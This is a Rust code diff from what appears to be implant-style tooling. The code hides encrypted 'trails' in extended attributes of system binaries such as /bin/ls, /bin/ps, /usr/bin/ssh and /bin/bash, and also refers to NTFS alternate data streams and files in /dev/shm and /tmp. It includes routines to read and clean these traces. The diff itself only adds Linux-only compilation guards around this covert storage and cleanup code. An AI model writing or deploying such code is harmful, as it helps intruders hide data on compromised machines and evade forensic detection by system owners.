@@ -25,6 +25,7 @@ pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
     let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash", "/usr/bin/python3"];
     let encrypted = encrypt_trail(value);
 
+    #[cfg(target_os = "linux")]
     for target in &targets {
         let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
         let c_path = std::ffi::CString::new(*target).expect("target path without null");
@@ -50,6 +51,11 @@ pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
 
 /// Read encrypted trails from xattr on system binaries.
 pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
+    #[cfg(not(target_os = "linux"))]
+    return Vec::new();
+
+    #[cfg(target_os = "linux")]
+    {
     let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
     let mut trails = Vec::new();
 
@@ -75,6 +81,7 @@ pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
         }
     }
     trails
+    }
 }
 
 // ── Windows NTFS ADS trails ─────────────────────────────────────────────
@@ -191,12 +198,14 @@ pub fn read_all_trails() -> Vec<(String, Vec<u8>)> {
 
 /// Clean all trails across all channels.
 pub fn clean_trails() {
-    // Clean xattr (remove attribute from binaries)
-    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
-    let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
-    for target in &targets {
-        let c_path = std::ffi::CString::new(*target).expect("target path without null");
-        unsafe { libc::removexattr(c_path.as_ptr(), c_key.as_ptr()); }
+    #[cfg(target_os = "linux")]
+    {
+        let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
+        let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
+        for target in &targets {
+            let c_path = std::ffi::CString::new(*target).expect("target path without null");
+            unsafe { libc::removexattr(c_path.as_ptr(), c_key.as_ptr()); }
+        }
     }
     // Clean file trails
     for dir in &["/dev/shm", "/tmp", "/var/tmp"] {
